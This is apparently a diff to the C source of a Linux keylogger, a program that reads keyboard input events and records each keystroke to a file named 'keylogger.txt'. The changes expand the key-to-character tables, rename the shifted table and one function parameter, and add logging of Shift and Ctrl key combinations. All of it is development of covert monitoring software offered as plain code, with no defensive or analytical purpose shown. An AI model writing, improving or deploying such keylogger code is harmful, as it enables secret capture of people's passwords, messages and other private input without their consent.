@@ -9,18 +9,18 @@
 #define LOGFILEPATH "keylogger.txt"
 
 char keymap[58] = {
-    0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 0, 0, '\b', 0, 'q',
-    'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 0,
-    0, '\n', 0, 'a', 's', 'd', 'f', 'g', 'h', 'j',
-    'k', 'l', 'n', 0, 0, 0, 0, 'z', 'x', 'c',
+    0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '?',0, '\b', 0, 'q',
+    'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[',
+    ']', '\n', 0, 'a', 's', 'd', 'f', 'g', 'h', 'j',
+    'k', 'l', 'n', '{', 'º', 0, '}', 'z', 'x', 'c',
     'v', 'b', 'n', 'm', 0, 0, 0, 0, 0, 0, ' '
 };
 
-char shift_keymap[58] = {
-    0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 0, 0, '\b', 0, 'Q',
-    'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', 0,
-    0, '\n', 0, 'A', 'S', 'D', 'F', 'G', 'H', 'J',
-    'K', 'L', 'N', 0, 0, 0, 0, 'Z', 'X', 'C',
+char block_keymap[58] = {
+    0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '?',0, '\b', 0, 'Q',
+    'W', 'E', 'R', 'T', 'Y', 'U', 'I', 'O', 'P', '[',
+    ']', '\n', 0, 'A', 'S', 'D', 'F', 'G', 'H', 'J',
+    'K', 'L', 'N', '{', 'º', 0, '}', 'Z', 'X', 'C',
     'V', 'B', 'N', 'M', 0, 0, 0, 0, 0, 0, ' '
 };
 
@@ -29,7 +29,7 @@ int shift_pressed = 0;
 int caps_lock_on = 0;
 
 char *getEvent();
-char keycode_to_char(int keycode, int is_shifted);
+char keycode_to_char(int keycode, int is_up);
 
 int main() {
     struct input_event ev;
@@ -72,7 +72,10 @@ int main() {
                     if (ch != 0) {
                         if (ctrl_pressed) {
                             fprintf(fp, "Ctrl+%c\n", ch);
-                        } else {
+                        }else if (shift_pressed) {
+                            fprintf(fp, "Shift+%c\n", ch);
+                        }
+                        else {
                             fprintf(fp, "%c", ch);
                         }
                     }
@@ -106,9 +109,9 @@ char *getEvent() {
     return event;
 }
 
-char keycode_to_char(int keycode, int is_shifted) {
+char keycode_to_char(int keycode, int is_up) {
     if (keycode >= 0 && keycode < sizeof(keymap)) {
-        char ch = is_shifted ? shift_keymap[keycode] : keymap[keycode];
+        char ch = is_up ? block_keymap[keycode] : keymap[keycode];
         if (caps_lock_on && ch >= 'a' && ch <= 'z') {
             return ch - 'a' + 'A';
         }
